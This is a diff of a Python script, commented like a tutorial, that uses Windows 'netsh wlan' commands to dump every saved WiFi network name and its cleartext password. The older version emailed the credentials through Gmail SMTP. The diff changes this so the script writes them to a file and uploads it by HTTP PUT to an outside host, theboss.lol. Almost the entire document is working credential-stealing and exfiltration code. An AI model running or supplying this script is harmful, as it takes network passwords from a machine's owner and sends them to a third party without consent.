@@ -1,7 +1,6 @@
 import subprocess
 import re
-import smtplib
-from email.message import EmailMessage
+import requests
 
 # Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
 # The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
@@ -11,7 +10,7 @@ command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_o
 # We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
 profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
 
-# We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
+# We create an empty list outside of the loop where dictionaries with all the wifi ssid and passwords will be saved.
 wifi_list = list()
 
 
@@ -26,7 +25,7 @@ if len(profile_names) != 0:
         if re.search("Security key           : Absent", profile_info):
             continue
         else:
-            # Assign the ssid of the wifi profile to the dictionary
+            # Assign the SSID of the wifi profile to the dictionary
             wifi_profile["ssid"] = name
             # These cases aren't absent and we should run them "key=clear" command part to get the password
             profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
@@ -41,27 +40,16 @@ if len(profile_names) != 0:
             # We append the wifi information to the wifi_list
             wifi_list.append(wifi_profile)
 
-# Create the message for the email
-email_message = ""
-for item in wifi_list:
-    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"
 
-# Create EmailMessage Object
-email = EmailMessage()
-# Who is the email from
-email["from"] = "name_of_sender"
-# To which email you want to send the email
-email["to"] = "email_address"
-# Subject of the email
-email["subject"] = "WiFi SSIDs and Passwords"
-email.set_content(email_message)
+# Write the contents of the wifi ssids and passwords to file
+with open('wifi.txt', 'w+') as fh:
+    for x in wifi_list:
+        fh.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")
 
-# Create smtp server
-with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
-    smtp.ehlo()
-    # Connect securely to server
-    smtp.starttls()
-    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
-    smtp.login("login_name", "password")
-    # Send email.
-    smtp.send_message(email)
+# Open file with read-only in binary so you can send via API
+with open('wifi.txt', 'rb') as fh:
+    # Do put request with the data as the file
+    r = requests.put("http://theboss.lol/", data=fh)
+    # status code should be 200 if successful
+    if r.status_code == 200:
+        print('Success')
